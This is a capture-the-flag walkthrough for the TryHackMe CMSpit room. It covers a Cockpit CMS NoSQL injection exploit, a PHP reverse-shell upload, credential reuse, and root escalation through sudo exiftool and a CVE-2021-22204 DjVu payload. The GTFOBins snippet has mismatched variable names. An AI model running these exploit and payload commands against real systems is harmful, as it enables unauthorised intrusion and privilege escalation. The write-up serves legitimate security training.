Room: [CMSpit](https://tryhackme.com/room/cmspit)

Difficulty: Medium

Overview: This room is really interesting has you are going to exploit diferent types of privilege escalations, from PATH hijacking, scripting, analyzing binaries and setuid capabilities will make you privesc horizontaly from user to user till you get to root!

--------------------------------------------------------------------------------------------------------------------------------------------------------------------

Let's start our enumeration fase with "nmap" and search for all open ports on the target system:

```
nmap -sV -sC -p- cmspit.thm -oN nmap.txt

-sV    →  Probe open ports to determine service
-sC    →  Scan using the default set of scripts
-p-    →  Scan all ports
-oN    →  Save the ouput of the scan in a file
```

![image](https://user-images.githubusercontent.com/76821053/130663300-0daf3ea7-10d5-4683-a33b-c5c7f9926436.png)

There are only two open ports:

22  →  OpenSSH 7.2p2
80  →  Apache httpd 2.4.18

After visiting the webpage i was redirected to a login portal:

![image](https://user-images.githubusercontent.com/76821053/130663322-4f143cb8-3435-45e4-88ba-50a7688e3115.png)

To better analyze the webserver we can use “nikto” which performs comprehensive scan tests against web servers:

```
nikto -h http://cmspit.thm
```

![image](https://user-images.githubusercontent.com/76821053/130663353-a2ccd257-07b3-4d01-8ecb-0dc3e8006878.png)

We found a file that contains usefull information:

![image](https://user-images.githubusercontent.com/76821053/130663377-8f4148cd-2a5b-4c3f-bd21-643e16fe622a.png)

Now that we have information about the content management system, its name and version. We can search [exploit-db](https://www.exploit-db.com/) for a possible exploit:

![image](https://user-images.githubusercontent.com/76821053/130663403-9d54e3c6-a765-4daf-a9b4-08c50504ec5f.png)

There is a exploit with a CVE number or CVE-2020-35846. This exploit takes advantage of NoSQL injection in /auth/check path which will let us do some username Enumeration & Password Reset. You can find more information about this exploit at [PT SWARM webpage](https://swarm.ptsecurity.com/rce-cockpit-cms/). They have a brake down of this exploit in detail. 

So to automate this process we are going to use the exploit script that we found at exploit-db, this exploit is a combination of CVE-2020-35847 and CVE-2020-35848:

```
python3 cockpit_exploit.py -u http://cmspit.thm
```

![image](https://user-images.githubusercontent.com/76821053/130663470-7bb60910-680e-4aec-9bd0-68d46564bd08.png)

This exploits found all the users in the database. If we want to find the email address of "skidy" we can just rerun the exploit and choose a diferent username:

![image](https://user-images.githubusercontent.com/76821053/130663496-d0b3c798-24e7-4640-abf4-d8b03f6727a4.png)

Now we can login to the webserver with the newly created “admin” credentials:

![image](https://user-images.githubusercontent.com/76821053/130663516-5053baa8-cd6f-4d15-806a-2512f7f42c54.png)

After browsing the admin dashboard there is an option to upload files to the webserver, so we are going to upload a php payload to get a reverse shell connection.

The php payload that i like to use is from “pentestmonkey”, we can download it from his [github page](https://github.com/pentestmonkey/php-reverse-shell).

We need to change this two parameters, ip and port:

![image](https://user-images.githubusercontent.com/76821053/130663540-5c05d719-94e6-439a-b53f-206f262673c0.png)

To upload the shell. From the dashboard choose “Finder”:

![image](https://user-images.githubusercontent.com/76821053/130663563-b91138cc-6ab9-4009-9767-cbc01e77e4c8.png)

And upload the payload to, for example "install" directory:

![image](https://user-images.githubusercontent.com/76821053/130663586-83207272-723b-47fb-a639-d2d48cf71e96.png)

To trigger the payload we just need to go to the correct url path:

```
http://ip_of_room/install/php-reverse-shell.php
```

![image](https://user-images.githubusercontent.com/76821053/130663629-5503c09d-f36f-4308-b871-2495679f7ce4.png)

And in our listener we receiver a shell:

![image](https://user-images.githubusercontent.com/76821053/130663675-ad2eea14-f9e1-47cd-8488-6e7bfaaccc6f.png)

To upgrade our shell to a tty one we can use this python command:

```
python3 -c "__import__('pty').spawn('/bin/bash')"
```

![image](https://user-images.githubusercontent.com/76821053/130663702-5dc9d078-ab92-4e14-8bd3-eb5f7131727e.png)

We can find the web flag at "/var/www/html/cockpit". Everytime we need to find a web related flag we should always start at the home of html path server:

![image](https://user-images.githubusercontent.com/76821053/130663729-dd85466a-fdd9-49f2-9132-45cbeb648058.png)

Enumerating the machine further we can escalate our privileges by checking user “stux” home directory:

![image](https://user-images.githubusercontent.com/76821053/130663754-dc274087-e2ce-4029-93c7-ffbd6ed376fc.png)

Inside his directory there is a database file called ".dbshell":

![image](https://user-images.githubusercontent.com/76821053/130663779-eb933f36-b75d-4d7b-bc93-6905a3e16ba9.png)

We have credentials for “stux” so let's login into that user:

```
su stux
```

![image](https://user-images.githubusercontent.com/76821053/130663805-9ec8f3dc-3051-4d67-ab83-c5983d2d3764.png)

With “stux” we can read the user flag:

![image](https://user-images.githubusercontent.com/76821053/130663832-2c8b4b5a-ace7-44f2-8235-22655cddf6dc.png)

Now that we are user “stux” let's check his sudo permitions:

```
sudo -l
```

![image](https://user-images.githubusercontent.com/76821053/130663855-4e1a96a9-728a-4e07-9502-3f325f75aee3.png)

“stux” can ran sudo on "exiftool" has user “root”. So let's head to [GTFOBins](https://gtfobins.github.io/gtfobins/exiftool/) and to see if there is any way we can exploit exiftool:

![image](https://user-images.githubusercontent.com/76821053/130663871-e38f081a-bb67-45b9-966e-72e01700391d.png)

Having sudo permissions to run exiftool we can easily read the root.txt flag if we follow GTFOBins read method:

```
LFILE=/root/root.txt
OUPUT=/home/stux/privesc
sudo exiftool -filename=$OUTPUT $FILE
cat $OUTPUT
```

![image](https://user-images.githubusercontent.com/76821053/130663893-48a725d2-e7b5-4477-9f3e-16078500ae52.png)

Now, if we want to escalate our privileges to “root” user we need to take advantage of a exiftool vulnerability.

This vulnerability has a CVE number of CVE-2021-22204:

![image](https://user-images.githubusercontent.com/76821053/130663938-2eca61ed-b152-4ccf-91da-e6ec19299961.png)

There is an awesome report on this bug in detail by [Convisoappsec](https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/).

There you will learn how to exploit the system by taking advantage of a tool called “djvumake”:

![image](https://user-images.githubusercontent.com/76821053/130663950-83e3b5d6-f2ce-4c87-b56e-7792eeb7ebf0.png)

Let's follow the steps and reproduce this vulnerability:

First we need to create a payload and save it to a file:

```
(metadata “\c${system('/bin/bash -p')};”)
``` 

![image](https://user-images.githubusercontent.com/76821053/130663968-94c0b308-a329-407c-8464-645d172a41be.png)

Next we need to compress the payload, create a .djvu file and trigger the exploit with exiftool:

```
bzz payload payload.bzz

djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz

sudo exiftool exploit.djvu
```

![image](https://user-images.githubusercontent.com/76821053/130664000-ce9897db-e146-42f2-91f1-ecbd612c1ea6.png)

Success, we are now “root”!!!

We can access “root's” directory directly and read the root.txt file:

![image](https://user-images.githubusercontent.com/76821053/130664023-d82d961c-e580-4015-a5b0-a5df97ce2c63.png)
















